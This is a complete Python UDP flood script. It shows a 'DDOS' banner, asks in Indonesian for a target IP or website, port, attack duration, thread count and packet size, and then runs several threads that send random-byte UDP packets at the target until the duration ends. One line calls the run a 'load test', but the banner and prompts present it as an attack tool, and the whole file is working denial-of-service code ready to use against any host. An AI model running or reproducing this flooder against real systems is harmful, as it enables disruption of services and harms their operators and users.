import argparse
import random
import socket
import threading
import time
import sys

def run_flood(target, port, duration, packet_size):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while time.time() < timeout:
        try:
            # Ensure packet size is reasonable
            actual_size = min(packet_size, 65507)  # Max UDP packet size minus headers
            bytes_sent = sock.sendto(random._urandom(actual_size), (target, port))
            print(f"Sent {bytes_sent} bytes to {target}:{port}")
        except Exception as e:
            print(f"Error: {e}")
    sock.close()

def validate_input(target, port, duration, threads, packet_size):
    try:
        # Validate packet size (max 65507 bytes for UDP)
        if packet_size <= 0 or packet_size > 65507:
            print("Error: Packet size must be between 1 and 65507 bytes for UDP")
            return False
        
        # Validate port number
        if port < 1 or port > 65535:
            print("Error: Port must be between 1 and 65535")
            return False
            
        # Validate duration
        if duration <= 0:
            print("Error: Duration must be positive")
            return False
            
        # Validate thread count
        if threads <= 0:
            print("Error: Thread count must be positive")
            return False
            
        return True
    except ValueError:
        print("Error: Invalid input format")
        return False

def main():
    print("""
    ██████╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
    ██║  ██║██║  ██║██║   ██║███████╗
    ██║  ██║██║  ██║██║   ██║╚════██║
    ██████╔╝██████╔╝╚██████╔╝███████║
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    """)
    
    try:
        # Input interaktif
        target = input("Masukkan alamat website/IP target: ")
        port = int(input("Masukkan port target (contoh: 80): "))
        duration = int(input("Masukkan durasi serangan (dalam detik): "))
        threads = int(input("Masukkan jumlah threads: "))
        packet_size = int(input("Masukkan ukuran packet (dalam bytes, max 65507): "))
        
        if not validate_input(target, port, duration, threads, packet_size):
            sys.exit(1)
        
        print(f"\nStarting load test against {target}:{port}")
        print(f"Duration: {duration} seconds")
        print(f"Threads: {threads}")
        print(f"Packet size: {packet_size} bytes\n")
        
        for _ in range(threads):
            threading.Thread(target=run_flood, args=(target, port, duration, packet_size)).start()
    except KeyboardInterrupt:
        print("\nScript terminated by user")
        sys.exit(0)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()